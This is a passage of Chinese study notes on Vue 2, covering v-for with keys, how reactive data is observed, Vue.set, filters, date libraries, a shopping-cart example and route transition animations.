// 根据数据生成多个li
<ul>
  <li v-for='item in persons'> </li>
</ul>
```

<br>

### **v-for='(item, index) in 数组对象' :key='item.id'**
**语法:**  
```js
<ul>
  <li v-for='item in persons' :key='item.id'>
    {{item.name}} - {{item.age}}
  </li>
</ul>

// 如果在遍历的过程中, 我们需要拿到元素在数组中的索引值 其中的index就代表了取出的item在原数组的索引值
v-for='(item, index) in items'
```

<br>

### **v-for='(value, key, index) in 对象' :key='key'**
使用v-for遍历对象 可以获取 属性值, 属性名, 索引值
```js 
<div id="app">
  <ul>
    <li v-for='(value, key, index) in info'>
      {{key}}:{{value}}:{{index}}
    </li>
  </ul>
</div>

const app = new Vue({
  el:'#app',
  data: {
    info: {
      name:'sam',
      age:18,
      height:1.88
    }
  }
)
```

<br>

### **v-for='(char, index) in 字符串' :key='index'**
使用v-for遍历字符串

<br>

### **v-for='(number, index) in 数字'  :key='index'**
使用v-for遍历指定次数
```js 
  v-for='(number, index) in 5'  :key='index'
  // 遍历5次
```

<br>

**技巧:**  
v-for也可以和配合``<template v-for>``来渲染一段结构  

*注意key值的问题* key值没有办法加在template上 我们只能加在元素节点上 利用 字符串dd + index 的形式来区分
```js 
  <template v-for="(item, index) of list">
    <dd :key="'dd' + index">
    <dt :key="'dt' + index">
  </template>
```

<br><br>

# v-for 与 v-if
同时使用 v-if 和 v-for 是不推荐的 因为这样二者的优先级不明显。 
```html
<!-- 这会抛出一个错误 因为属性 todo 此时没有在该实例上定义 -->
<li v-for="todo in todos" v-if="!todo.isComplete">
  {{ todo.name }}
</li>
```

### **解决办法:**
在外新包装一层 ``<template>`` 再在其上使用 v-for 可以解决这个问题 (这也更加明显易读): 

```html
<template v-for="todo in todos">
  <li v-if="!todo.isComplete">
    {{ todo.name }}
  </li>
</template>
```


<br><br>

### 案例: 列表过滤(模糊搜索)
需求: 用户输入文字 我们根据文字来过滤列表中的数据 比如我输入"马" 页面上展示马冬梅 我输入"周" 页面上展示周冬雨 和 周杰伦
```html
<input type="text" v-model='info' placeholder="请输入名字">
<ul>
  <li v-for='(item, index) in persons' :key='index'>
    {{item.name}} -  {{item.age}}
  </li>
</ul>

<script>
  new Vue({
    el: '#root',
    data() {
      return {
        persons: [
          {id: '001', name: '马冬梅', age: 18},
          {id: '002', name: '周冬雨', age: 17},
          {id: '003', name: '周杰伦', age: 4},
          {id: '004', name: '温兆伦', age: 33},
        ],
        info:''
    } }
  })
</script>
```

**思路:**  
1. 收集用户收入数据
2. 拿着用户的输入去匹配

这个案例最标准的做法是用计算属性去写 我们先用watch来实现

<br>

**<font color="#C2185B">watch实现的思路: </font>**  
用户输入的数据我们可能拿到 接下来我们就要拿着用户输入的数据去用户信息的数据中去进行过滤  
我们使用的是v-model来实现的数据获取 假如我们输入了 "刘" 我们需要过滤一遍用户信息的数据 假如我们输入的是 "王" 那么我们需要再次的过滤遍数组

也就是说当用户输入的关键词发生变化的时候 我们都要进行过滤 那我们怎么知道 用户输入的数据info变了呢 这时候 就要使用 watch 吧  
也就是说我们拿着用户输入的数据info 去数组persons 中进行过滤 filter

```js 
persons: [
  {id: '001', name: '马冬梅', age: 18},
  {id: '002', name: '周冬雨', age: 17},
  {id: '003', name: '周杰伦', age: 4},
  {id: '004', name: '温兆伦', age: 33},
],
info:'',

// 定义接收过滤出来的数据 盛放的新数组
personsArr: []


// 使用watch去监听 info 当info发生改变的时候 会自动调用回调
watch: {
  info(n) {
    /*
      思路:
        我们拿着 info 去监测数组中的每一项里是否包含 info 如果包含 就将其找到 返回出来

      注意:
        filter不会影响原数组它会将找到的值 返回一个新数组 但是 我们不能
        this.persons = this.persons

        这样会删除原数组的数据 造成数据越找越少
        所以我们创建一个新的空数组 将过滤出来的数据装到空数组中 dom结果的位置 遍历空数组
    */

    // 方式1:
    this.personsArr = this.persons.filter(item => {
      return item.name.match(n) != null
    })

    // 方式2:
    this.personsArr = this.persons.filter(item => item.name.indexOf(n) != -1)
  }
}
```

上面做完有问题 基本的逻辑可以实现 但是 当用户没有在文本框里面输入任何文字的时候我们读取的是""  
拿着""空串去查找 全都是true 那怎么办？
```js
let arr = ["aa", "bb", "cc"]
let info = ""

arr.forEach((item, index) => {
  // 结果都是 0
  console.log(`${index} -- ${item.indexOf(info)}`)

  // 结果都是 空, 空 ！= null
  console.log(`${index} -- ${item.match(info)}`)

  // 结果都是 true
  console.log(`${index} -- ${item.includes(info)}`)
})
```
**注意:**
空字符串的indexOf为  0
空字符串的includes为 true

<br>

我们将watch写成完全形式 并且传入配置项 immediate 为 true 一上来就会先执行一遍回调 这时候我们拿到的就是"" 拿着空串去过滤 会全部匹配 页面就会有值了
```js 
  watch: {
    // 使用watch的完整形式
    info: {

      // 假如这个配置项 让它上来先执行一遍
      immediate:true,

      handler(n) {
        this.personsArr = this.persons.filter(item => {
          return item.name.indexOf(n) !== -1
        })
      }
    }
  }
```

<br>

**完整代码:**
```html
<template>
  <div id="app">
    <ul>
      <li><input type="text" v-model="msg" /></li>

      <li 
        v-for="item of newPersons" 
        :key="item.id"
      >
        {{item.name}} -- {{item.age}}
      </li>
    </ul>
  </div>
</template>

<script>
  export default {
    name: 'App',
    data() {
      return {
        persons: [
          {id: '001', name: '马冬梅', age: 18},
          {id: '002', name: '周冬雨', age: 17},
          {id: '003', name: '周杰伦', age: 4},
          {id: '004', name: '温兆伦', age: 33},
        ],
        msg: "",
        newPersons: []
      }
    },
    watch: {
      msg: {
        immediate: true,
        handler(n) {
          this.newPersons = this.persons.filter(item => {
            return item.name.match(n) != null
          })
        }
      }
    }
  }
</script>
```

<br>

**<font color="#C2185B">computed实现的思路: </font>**  
计算属性中依赖了info 它会在两个时间点触发 一个是一上来 一个是依赖的info发生了变化它会重新计算 也就是说 info 一旦发生改变 整个计算属性都会跟着变

我的想法是 计算属性 当有人读取计算属性的时候  它当中的getter方法会从一个地方得到值然后做展示 我们页面上使用 personsArr计算属性进行的遍历 相当于读取了它 它当中的getter就去某个地方拿出来 
我让它拿用户信息的元数据 persons 当然我们要拿的是 根据用户输入的信息 检索出来的结果

因为用户输入信息 info 一旦发生改变 计算属性中依赖了info info变 计算属性就会重新计算 页面就会根据计算属性的结果 重新渲染
```js 
  computed: {
    personsArr() {
      return this.persons.filter(item => {
        return item.name.indexOf(this.info) !== -1
      })
    }
  }
```

要点: 对过滤数组做监视 personsArr

<br>

**注意:**
- 我们尽量不要操作元数据 可以创建一个新的空数据盛放搜索的结果
- str.match(val)    找到显示对应的数据 找不到为 null
- str.indexOf(val)  找到显示数据的下标 找不到为 -1  
  都可以判断内容是否含有指定值 但是 如果我们val 是 "" str的结果也是能找到 注意注意

<br>

### 案例: 列表排序
我们对上面的例子添加一些功能 添加两个按钮 年龄升序 年龄降序 元顺序
点击 年龄升序 之后 页面的列表会按照年龄升序排列
点击 年龄降序 之后 同上

注意: 
新功能是上面的过滤是不分家的 比如 用户输入 周 会显示周杰伦 和 周冬雨 这时候我们点击排序就会对 周杰伦 和 周冬雨进行排序


思路: 
我们要知道用户点击按钮是 年龄升序 年龄降序 元顺序 所以我们要设置一个标识

元顺序    0
年龄降序  1
年龄升序  2

我们要设计一个变量用来存储用户要操作的类型是什么 sortType
```js 
  <button @click='sortType=2'>年龄升序</button>
  <button @click='sortType=1'>年龄降序</button>
  <button @click='sortType=0'>原顺序</button>

  data() {
    return {
      sortType: 0  // 0原顺序 1降序 2升序
    }
  }
```

因为我们的过滤和排序是不分家 页面渲染也是根据 personsList 这个计算属性来渲染的 所以我们要对 personsList 这个数据 进行排序
```js 
  computed: {
    personsList() {

      // 这里我们不能着急的将结果返回 这么返回就是过滤后的结果 我们要再处理好排序的功能后再返回
      return this.persons.filter(item => {
        return item.name.indexOf(this.info) !== -1
      })
    }
  },



  computed: {
    personsList() {
      const arr = this.persons.filter(item => {
        return item.name.indexOf(this.info) !== -1
      })

      // 判断一下是否需要排序 当sortType为0的时候就是false 不会走里面的逻辑 内部我们可以通过三元表达式来判断看看是不是1

      // 需要注意的是 我们是根据年龄来排序 我们要通过 a.age - b.age 的方式进行排序
      if(this.sortType) {
        arr.sort((a, b) => {
          return this.sortType === 1 ? a.age - b.age : b.age - a.age
        })
      }

      return arr
    }
  },
```

注意: 
我们在使用 sort 的时候假如a 和 b是对象的情况下 要通过对象.的方式根据对象内部的属性来进行排序

<br><br>

# 组件的 :key 属性
key的作用就是给节点进行一个标识 相当于人类社会的身份证号 在将结构渲染到列表上的时候 标签属性中不会再出现key 因为这个key是vue在用的  
官方推荐我们再使用v-for时, 给对应的元素或组件添加一个 :key 属性 添加key属性的原因是和vue的虚拟DOM的diff算法有关系

当某一层有很多相同的节点时, 也就是列表节点时, 我们希望插入一个新的节点
```
A B C D E
```
我们希望可以在B 和 C之间添加一个F, diff算法默认执行起来是这样的 它会把C更新成F D更新成C E更新成D 最后再插入E, 是不是很没有效率
```
虚拟DOM     真实DOM
li1 > A     li1 > A
li2 > B     li2 > B

li6 > F

li3 > C     li3 > C
li4 > D     li4 > D
li5 > E     li5 > E
```

它会把3改成f 4改成c 5改成d 6创建e, 这样很笨的, 原来在中间插入就可以了, 但是它却是挨个替换  
所以需要使用key来给每一个节点做一个唯一标识 diff算法就可以正确的识别此节点, 找到正确的位置区插入新的节点, 所以一句话, key的作用主要是为了高效的更新虚拟DOM

<br>

### **react vue中的key有什么用？**
key是虚拟dom对象的标识 当数据发生变化的时候 vue会根据 新数据 生成 新虚拟dom 随后vue进行 新虚拟dom 与 旧虚拟dom的差异比较 比较规则如下

- 旧虚拟dom中找到了与新虚拟dom相同的key  
若虚拟dom中的内容没变 直接使用之前的真实dom  
若虚拟dom中的内容变了 则生成新的真实dom 随后替换掉页面中之前的真实dom

- 旧虚拟dom中未找到与新虚拟dom相同的key  
创建新的真实dom 随后渲染到页面

- 用index作为key可能会引发的问题  
若对数据进行 逆序添加 逆序删除等破坏顺序的操作 会产生没有必要的真实dom更新 界面没有问题但是效率低
若结构中还包含输入类的dom 会产生错误dom更新 界面有问题

<br><br>

# vue 监测对象数据改变的原理
我们会在data中配置变量 当我们改变这个变量的时候 页面中应用到这个变量的地方就会发生改变
```js 
  data: {
    name: 'sam'   // 当发生改变的时候 页面用到name的地方也会自动发生变化
  }

  {{name}}
```

实现这些的原因就是我们修改了name被vue监测到了 那vue怎么知道name被修改了？ watch？   
vue里面默认就有一个监视 这个监视的作用就是当数据被改变的时候就自动更新用到这个数据的地方 而watch这个监视就vue交给程序员用的 但是无论是vue默认的监视 还是 交给程序员的watch底层原理都是一样的

<br>

我们要分析一下watch监测数据的原理 阐述之前我们先看看一个小例子
```js 
  <button @click='updateMei'> 更新马冬梅信息 </button>
  
  <ul>
    <li v-for='(item, index) in persons' :key='item.id'>
      {{item.name}} -  {{item.age}}
    </li>
  </ul>

  methods: {
    updateMei() {
      // this.persons[0].name = '马老师'    // 奏效
      // this.persons[0].age = 30          // 奏效

      // 整个 对象 都被 替换掉了
      this.persons[0] = {id: '001', name: '马老师', age: 30}
    }
  }
```
马老师的对象被整个替换掉了 但是vue页面没有发生变化 从代码层面讲 是被修改了 但是 vue 并没有检测到  
上面的小例子中我们整体替换掉了数组中的一个对象 导致了页面并没有更新 正常来讲我们修改了data中的数据 那么页面上用的该数据的地方就会自动更新 原因就是我们的修改 vue并没有监测到 那原因是什么呢？

<br>

### **vue是如何监测对象中的属性的改变的**
```js 
data: {
  name: '尚硅谷',
  address: '北京'
}


<div>
  {{name}} - {{address}}
</div>
```

我们在data中定义的变量name address会在vm的身上也有一份 vm身上的name address都是来自于 _data中 _data中的数据 来自于我们传入的data配置项
```
  data name address
```

在这之前还对data中的数据做了一些特殊的处理才放到了_data中
```
     --- _data name address
        --- vm name address
        (使用defineproperty的getter从_data中获取的)
```

但是 vue 在将 data中的数据 复制一份到 _data之前还对数据做了一些的处理 这个特殊的处理就是我们要了解的部分  
我们打印一下 vm._data看看结果 我们只是在data中配置了name 和 address 但是在_data中 我们的数据变成了下面的样子 为什么呢？

```js 
// _data 中的数据
{__ob__: Observer}
  address: (...)
  name: (...)
  __ob__: Observer {value: {…}, dep: Dep, vmCount: 1}
  get address: ƒ reactiveGetter()
  set address: ƒ reactiveSetter(newVal)
  get name: ƒ reactiveGetter()
  set name: ƒ reactiveSetter(newVal)
  [[Prototype]]: Object
```

我们在data中直接配置的是 name address 但是在._data中 name 和 address的值 给的不是那么直接了 必须要通过 getter 去拿 修改的时候要使用setter  
也就是说我们所谓的加工就是将我们传入的每一组kv 都加工成了getter 和 setter的样式  
正是因为加工这一下子就能做响应式了 比如我们修改了_data.name 那么就会引起setter的调用 vue在setter里面写了一个调用 它会重新的解析模板 生成虚拟dom 进行比较 渲染页面

<br>

### **简单的模拟下数据监测**
我们有一组对象 当该对象的属性被修改的时候 我要输出一句话 该属性被修改了
```js 
let data = {
  name: 'sam',
  address: 'beijing'
}
```

先说下自己的思路 我想做一层数据代理 创建了一个空对象 使用Object.defineProperty方法在空对象当中添加name属性 name的属性值通过getter去data.name中获取 在setter中写当修改了name属性的时候我们输出逻辑

```js 
let middle = {}
Object.defineProperty(middle, 'name', {
  get() {
    console.log('data.name 被读取了')
    return data.name
  },

  set() {
    console.log('data.name 被设置了')
  }
})
```

老师带咱写的逻辑 首先定义了一个构造函数 在new 实例的时候传入 data对象
然后构造函数中接到data对象 开始遍历属性名 使用Object.defineProperty方法将属性名添加到obs实例对象上 然后设置了getter setter  

getter 当读取实例中的属性的时候 将data中的对应属性交出去  
setter 当设置属性的时候 我们去改变data中的对应属性 同时在setter中做更新页面的逻辑
```js 
  let data = {
    name: 'sam',
    address: 'beijing'
  }

  // 创建一个监视的实例对象 用于监视data中属性的变化
  const obs = new Observer(data)
  console.log(obs);

  let vm = {}
  vm._data = obs

  // 它的作用是创建一个监视的实例对象 接收一个对象作为参数
  function Observer(obj) {
    // 汇总对象中所有的属性形成一个数组
    let keys = Object.keys(obj)

    // 遍历keys 利用Object.defineProperty方法 往this身上添加属性 this是上面的obs
    keys.forEach(key => {
      Object.defineProperty(this, key, {
        get() {
          return obj[key]
        },

        set(val) {
          obj[key] = val
        }
      })
    })
  }
```

以上就是就是vue监测对象数据的原理

<br><br>

# Vue.set() API
有一种情况 比如我们在页面上展示了data中的一个students对象 我们展示了 姓名 性别 当有一天我们还想在页面中展示学生的年龄 怎么办？ 我们可以往data中的学生对象中添加一个年龄的属性么

```js 
  {{student.name}} -- {{student.age}}

  data: {
    student: {
      name: 'sam'
    }
  }

  vm._data.student.age = 18

  {age: 18, __ob__: Observer}

    age: 18        // 它没对应的setter getter

    name: (...)
    __ob__: Observer {value: {…}, dep: Dep, vmCount: 0}
    get name: ƒ reactiveGetter()
    set name: ƒ reactiveSetter(newVal)

```

我们通过vm._data.student.age = 18 添加了年龄是18 但是我们发现 页面用到年龄的地方并没有更新  
而且我们发现通过这种方式添加进去的age 并不是 数据监视的状态 它虽然添加在vm身上了 但是因为不是数据监测的状态 就没办法做到响应式

因为我们这样添加进去的age 没有对应的getter 和 setter  
因为我们最开始在data中配置的数据 是在vue new的时候将data中的数据收集到了_data中 然后以_data中的数据做了数据代理放在了vm上 所以才能做到响应式的

也就是说我们想用什么 当年一定要先配置好 后期再往里添加的时候 想要做到响应式 就要使用 vue给我们提供的api 


### **Vue.set(target, key, value)**
使用该方法往对象中添加属性 也能做到响应式 该方式也可以修改数组身上的数据
```js  
Vue.set(this.arr, 1, ”逛街“)
```  

**参数:**  
1. 要往谁的身上追加一个属性
2. 属性名
3. 属性值
```js
methods: {
  handleStudent() {
    Vue.set(this.student, 'age', 18)
  }
}
```

<br>

### **vm.$set(target, key, value)**
### **this.$set(target, key, value)**
和上面是一样的作用 注意 vm 就是this 也可以是this.$set()


**注意:**  
该方法只能给data里面的对象里面添加属性 而不是直接在data里面添加属性
```js 
data: {

  // vm.$set(student, age, 18) 这是可以的 因为它在给data里面的student对象里面添加属性
  student:{     
    name
  }

  // vm.$set(data, leader, sam) 这会报错 不能直接给data里添加属性
  leader: 
}
```

也就是说这个api的第一个参数不能是vm 和 data

<br>

### **this.$delete(target, key)**
### **Vue.delete(target, key)**
移除一个响应式的数据

<br><br>

# vue 监测 数组 数据改变的原理
我们上面知道 当我们在new vue的时候在data中的数据都会被添加数据监测后放到_data里面同时对_data中的数据做数据代理放到vm身上

那也就是说 每一个在data中的数据都会有一套为之对应的getter和setter
但是我们发现 我们试图找hobby数组的元素的时候 展开这个数组 并没有发现 里面元素的getter和setter

也就是说 vue并没有为数组里面的元素匹配一个getter 和 setter
```js 
data() {
  return {
    student: {
      name: 'sam',
      hobby: ['抽烟', '喝酒', '烫头']
    }
  } 
},


{__ob__: Observer}
  hobby: Array(3)
  0: "抽烟"
  1: "喝酒"
  2: "烫头"
  length: 3
  __ob__: Observer {value: Array(3), dep: Dep, vmCount: 0}
```

因为数组里面的你每一个元素并没有对应的getter 和 setter 那也就是说 我们通过数组的索引去改变这个数据的时候 vue是监测不到的 也就是说数组里面的元素不是靠setter 和 getter来监视的
```js 
  this.hobby[0] = 'haha'
  // 这样的方式vue是监测不到的 不会引起页面的更新 
```

我们可以打开vm看看有没有setter 和 getter就知道了

那vue是怎么做的呢？假如我们想修改下下面的数组 我们会用什么方法呢?
```js 
  let arr = [1,3,5,7]

  push
  pop
  shift
  unshift
  splice
  sort
  reverse
```

尤大大说了只有调了数组上的这些方法我才承认你修改了数组 *注意只有影响原数组的方式尤大大才会承认*
```js 
  vm._data.student.hobby.pop()  这样操作的结果才能引起响应式
```

那vue怎么知道我们使用了push等这些方法的呢
vue用了 包装技术 将 上述的数组上的方法进行了包装 也就是说我们看到的不再是数组原型上的供给数组使用的方法了 而被vue进行了包装 我们调用的是vue给我们提供的push
```js 
  vm.data.student.hobby.push === Array.prototype.push   // false
```

也就是说我们沿着hobby的原型上找先找到的是vue给我们写的push vue在这个push中做了两件事情
1. 它先给你调用了正常数组上的push方法
2. 重新解析模板生成虚拟dom。。。

vue对数组的监测是靠包装数组原型上的方法实现的

我们还可以通过这个api来处理操作数组达到响应式的逻辑


### **Vue.set() 方法**
Vue.set(arr, index, value)
参数:
1. 要修改的数组
2. 要修改的索引值, 就是修改哪个元素
3. 修改后的值
```js 
  Vue.set(this.letters, 0, 'bbb')
```

<br><br>

# 过滤器 filters
过滤器的逻辑我们还可以用 methods 和 computed 都能实现 过滤器简单的理解为, 将数据 '过滤 / 格式下' 再显示在html结构中
```
比如我们可以过滤 时间, 数字, 后端传递过来的数据 
```

该方法能够接收到模板中 | 管道符号前面的数据 做为过滤器函数中的形参, 方法内部需要返回值
```
数据 | 过滤器方法
```

<br>

### **语法:**
```js
{{value | 过滤器函数}}

filters: {
  过滤器函数(value, 第二个参数) {
    return 函数内部需要返回值;
  }
}
```

**参数:**  
1. 管道符号前面的值
2. 任意参数

<br>

**返回值:**  
当解析的时候 过滤器函数的返回值 会替换掉 {{value | 过滤器函数}} 整个部分


```js 
// moment 
// 比如我们后端传递过来的数据 2019-11-19T04:32:46Z
filters: {
  format(val) {
    return moment(val).format("YYYY-MM-DD HH:SS");
  }
}

<div>{{this.detailList.update_time | format}}</div>


// day
<div>{{time | timeFormat}}</div>

filters: {
  timeFormat(time) {
    return dayjs(time).format('YYYY-MM-DD HH:mm:ss')
  }
}
```

<br>
 
**应用场景:**   
使用一个过滤器 过滤不同风格的数据
```js 
<div>{{time | timeFormat('YYYY-MM-DD')}}</div>
    //2021-08-27


<div>{{time | timeFormat}}</div>
    // 2021-08-27 15:51:13


filters: {

  // 给了形参一个默认值
  timeFormat(time, str='YYYY-MM-DD HH:mm:ss') {
    return dayjs(time).format(str)
  }
}
```

<br>

### **多个过滤器之间可以串联**
上面我们定义了一个格式化时间的 我们再定义一个保留字符串前4位的过滤器  
我们几个过滤器可以连续使用 第一个过滤器工作后的结果交给下一个过滤器 一层层传递
```js 
<div>{{time | timeFormat('YYYY-MM-DD') | strFormat}}</div>

filters: {

  // 格式化时间
  timeFormat(time, str='YYYY-MM-DD HH:mm:ss') {
    return dayjs(time).format(str)
  },

  // 字符串截取
  strFormat(val) {
    return val.substr(0,4)
  }
}
```

<br>

### **配置全局过滤器: Vue.filter('过滤器的名字', fn)**
参数: 注册过滤器的名字, 过滤器的处理函数
```js 
Vue.filter('strFormat', function() { })
```

<br>

### ***标签属性中也可以使用过滤器***
过滤器不仅仅只能用在 插值语法 中 还可以使用在标签属性中  
我们使用v-bind绑定属性 这样引号里的部分就可以写表达式 就能应用 过滤器
```js 
<h3 :x='msg | strFormat'>测试文本</h3>  
    // <h3 x='你好呀 '>

data: {
  msg: '你好呀 尚硅谷'
}
```

<br><br>

# moment.js / day.js库
上两个时间的格式化库使用方式一样 只是后面的更加的轻量级
https://cdn.bootcdn.net/ajax/libs/dayjs/1.10.6/dayjs.min.js

2022/09/18 moment.js已经停止维护

<br>

### **moment基本用法:**
只要我们引入了momentjs的库 全局就多了一个moment()函数

```js  
moment(要格式化的时间).format('MMMM Do YYYY, h:mm:ss a')
```

<br>

### **dayjs基本用法:**
只要我们引入了dayjs的库 全局就多了一个dayjs()函数
```js  
  // 官网示例
  dayjs(要格式化的时间)
    .startOf('month')
    .add(1, 'day')
    .set('year', 2018)
    .format('YYYY-MM-DD HH:mm:ss')
```

如果不传入要格式化的时间的话 会以当前时间做格式化

<br>

### **Moment.js**
时间格式化库的使用方式

1. 获取当前系统的时间
```js 
moment().format('YYYY-MM-DD HH:mm:ss')
```

2. 指定时间格式化
```js 
moment('1992-02-22 10:10:10').format('YYYY-MM-DD HH:mm:ss')

  // 或者

let date = moment('1992-02-22 10:10:10')
date.format('YYYY-MM-DD HH:mm:ss')
```

3. 查看10天之后是什么日期
```js 
let date = moment('1992-02-22 10:10:10')

// 看看10天之后
date.add(10, 'days').format('YYYY-MM-DD HH:mm:ss')
```

<br><br>

# 案例: 图书购物车
**根据数据动态生成行:**  
```js 
// 数据
data: {
  books: [
    {id:1,name:'算法导论',date:'2006-9',price:85.00,count:1},
    {id:2,name:'UNIX编程艺术',date:'2006-2',price: 59.00,count:1},
    {id:3,name:'编程珠玑',date:'2008-10',price:39.00, count:1},
    {id:4,name:'代码大全',date:'2006-3',price:128.00,count:1}
  ]
}
```

一般情况下 我们在制作的表格的时候 里面的内容都不是写死的, 而是从哪获取的数据动态的生成的表格, 这里我们要用v-for来遍历这个数组  
我们在tr上v-for 因为一本书就是一行, 对于每一行的单元格的遍历 我们有两种方式

<br>

**方式1:**  
*我们并不推荐方式1* 因为这是整体把数据渲染到DOM结构中, 所以当想对元素做局部的调整的时候 很困难, 比如 我们在count前面添加- + 按钮, 比如给price价格的后面添加小数等等
```js 
  <tr v-for='item in books'>
    <td v-for='value in item'>{{value}}</td>
  </tr>
```

**方式2:**  
在对tr使用v-for后 我们是item.属性的方式 手动创建td
```js 
  <tr v-for='item in books'>
    <td>{{item.id}}</td>
    <td>{{item.name}}</td>
    <td>{{item.date}}</td>
    <td>{{item.price}}</td>
    <td><button>-</button><span>{{item.count}}</span><button>+</button></td>
    <td><button>移除</button></td>
  </tr>
```

<br>

### **总结:**
当我们要对局部的结构操作的时候 那么手动创建结构 然后依次填入数据 不要渲染整个tr结构 这样没办法操作td

<br>

### **保留两位小数, price前面添加符号的方法**
**方式1:**  
利用拼接, 缺点不灵活 很繁琐, 尤其是在需要修改的地方比较多的情况下, 另外, html代码的结构阅读起来也不够的清晰
```js 
<td>{{'$' + item.price.toFixed(2)}}</td>
```

**方式2:**  
利用methods 在里面定义函数 我们在调用函数的时候, 把item.price作为参数传递了进来
```js 
  <td>{{getFinalPrice(item.price)}}</td>

  methods: {
    getFinalPrice(price) {
      return '$' + price.toFixed(2);
    }
  },
```

**方式3:**  
利用filters 在里面定义函数 它会把要过滤的东西作为参数传递到函数的里面
```js 
  {{item.price | showPrice}}

  filters: {
    showPrice(price) {
      return '$' + price.toFixed(2);
    }
  }
```

<br>

### **点击按钮 操作count的加减**
**思路:**  
我们在methods中定义两个函数, 来控制按钮的点击 我们在点击按钮修改count的时候, 改的是对应书的count, 所以我们面临的第一个问题就是 我们要知道点了哪一本书  
我们就要在v-for遍历books的时候, (item, index) 把这个index 通过 @click='increment(index) 函数调用的方式传递给methods中的函数 

<br>

**要点:**  
:disabled='item.count <= 1' 下面还利用了 共同变量 index 即操作按钮也能操作数组
```html
  <button 
    @click='decrement(index)' 
    :disabled='item.count <= 1'>-</button>

  <button 
    @click='increment(index)'>+</button>

<script>
  methods: {
    decrement(index) {
      // 然后我们根据index就能取到点击的那本的count
      this.books[index].count--;
    },

    increment(index) {
      this.books[index].count++;
    }
  },
</script>
```

还有 我们在修改count的时候 不能为负数, 或者说不能小于1, 当<=1的时候 我们禁用按钮的点击功能, 当为true的时候 禁用按钮 既然后面是一个布尔值 我们可以通过如下的方式, 动态的修改是否禁用按钮

```
  v-bind:disabled
```

```js 
  <button disabled = true / false>

  <button 
    @click='decrement(index)' 
    :disabled='item.count <= 1'>-</button>
```

<br>

### **移除按钮 和 删除所有数据后 页面显示 购物车为空**
**购物车为空:**  
如果页面有数据(表内没删完)就显示表格内的数据, 当删完了就显示购物车为空

使用v-if v-else 我们再v-if中添加 books.length 因为表是通过data中的数组创建的, 所以清空数组后books.length的值为0 0转换为布尔值为false  
那么就说明 本身就有两个结构, 我们通过v-if v-else还决定显示哪个部分
```js 
<div v-if='books.length'>
  <table></table>
</div>

<h3 v-else>购物车为空</h3>
```

**移除按钮:**  
在这里我们也要传递进来一个index 我们要知道我们移除的是哪个
```js 
removeHandle(index) {
  this.books.splice(index, 1);
}
```

<br>

### **总价格的部分**
我们使用计算属性来做
```js 
<h3>总价格: {{totalPrice | showPrice}}</h3>

computed: {
  totalPrice() {
    let totalPrice = 0;
    for(let i=0; i<this.books.length; i++) {
      totalPrice += this.books[i].price * this.books[i].count;
    }
    return totalPrice;
  }
}
```

<br>

### **完整的代码部分:**
```js 
const app = new Vue({
  el:'#app',
  data: {
    books: [
      {id:1, name:'算法导论', date:'2006-9', price:85.00, count:1},
      {id:2, name:'UNIX编程艺术', date:'2006-2', price: 59.00, count:1},
      {id:3, name:'编程珠玑', date:'2008-10', price:39.00, count:1},
      {id:4, name:'代码大全', date:'2006-3', price:128.00, count:1},
    ]
  },
  methods: {
    decrement(index) {
      this.books[index].count--;
    },
    increment(index) {
      this.books[index].count++;
    },

    removeHandle(index) {
      this.books.splice(index, 1);
    }
  },
  
  filters: {
    showPrice(price) {
      return '$' + price.toFixed(2);
    }
  },

  computed: {
    totalPrice() {
      let totalPrice = 0;
      for(let i=0; i<this.books.length; i++) {
        totalPrice += this.books[i].price * this.books[i].count;
      }
      return totalPrice;
    }
  }
})
```

<br><br>

# Vue 动画效果
操作 css 的 transition 或 animation vue 会给目标元素添加 / 移除特定的class 

<br>

### **使用动画的方式:**

1. **定义一个动画**   
我们在组件内部定义一个动画 内部使用vue定义好的类名  

```
进入时候要激活的样式:  .v-enter-active
离开时候要激活的样式:  .v-leave-active
```

```css
.v-enter-active {
  animation: move 1s
}

.v-leave-active {
  animation: move 1s reverse
}

@keyframes move {
  from {
    transform: translateX(-100px)
  }
  to {
    transform: translateX(0px)
  }
}

/* 我们只要把两个类名 和 一个动画准备好 一包裹 完活 */
<transition>目标<transition>
```

<br>

### **2. 使用 ``<transition>`` 组件 将要发生动画的元素 包裹起来**

**使用场景:**  
仿微信页面滑入滑出的效果, 我们使用 ``<transition>`` 组件将 ``<router-view>`` 包裹起来

```html
<transition>
  <router-view></router-view>
</transtion>
```

<br>

### **Vue中过渡实现的原理:**  
**<font color="#C2185B">v-enter-active</font>**  
如果一个元素出现在屏幕上的话 比如我们父路由跳转到子路由 子路由出现在页面上(或者叫进入了视口)

这时候子路由这个页面就有相对应的3个类名

- v-enter: 元素刚进来的时间点
- v-enter-to: 元素进来结束的时间点
- v-enter-active: 在整个进来的过程中 都会存在的一个类名

```
            Enter

opacity: 0  --->  opacity: 1
    ↓                 ↓
 v-enter          v-enter-to
``` 

当我们给 transition 组件起上名字后 那就变成了
```
v-enter -> name-enter
```

<br>

**<font color="#C2185B">v-leave-active</font>**  
离开和进入的类名都是一样的
```
            Leave

opacity: 1  --->  opacity: 0
    ↓                 ↓
 v-leave          v-leave-to
``` 

<br>

**场景: 仿微信页面滑入滑出效果**  
当父路由跳转到子路由 子路由会从左滑入到视口  

我们给 transition组件上起个名字 slide-left 代表向左滑入
```html
<transition name="slide-left">
  <router-view></router-view>
</transtion>
```

那我们思考下 子页面向左滑入页面后 会有什么样的变化:  
对于父页面而言 子页面向左滑入视口 父页面从视口向左滑出

```
-100%   0   100%

      父页面 
        ←
 left:0 ~ left: -100% 


      子页面
        ←
 left:100% ~ left: 0
```

```css
/* 父页面 */
.slide-left-leave {
  /* 刚开始离开的时间点 */
  transform: translateX(0)
}

.slide-left-leave-to {
  /* 结束的时间点 就应该在-100% */
  transform: translateX(-100%)
}
```

上面是对于 父页面 的变化 父页面是离开  
对于子页面而言 子页面应该是从 100% ~ 0 的位置 子页面是进入

```css
/* 子页面 */
.slide-left-enter {
  /* 刚开始进入的时间点 */
  transform: translateX(100%)
}

.slide-left-enter-to {
  /* 结束的时间点 就应该在-100% */
  transform: translateX(0%)
}
```

然后我们要在 .slide-left-leave-active 类里面一直要监听 css 属性变化的
```css
.slide-left-leave-active,
.slide-left-enter-active {
  transition: all, 0.5s;

  /* 在子路由进入的时候 会发生错位空白的现象 所以我们可以这么设置 */
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
}
```

上面完成了子页面左滑入 父页面左滑出的效果

当我们返回父页面的时候 我们希望的是 父页面右滑入 子页面右滑出 所以我们可以给 transition 组件 添加一个名字
```html
<transition name="slide-right">
  <router-view></router-view>
</transtion>
```

那我们就有两种情况了:  
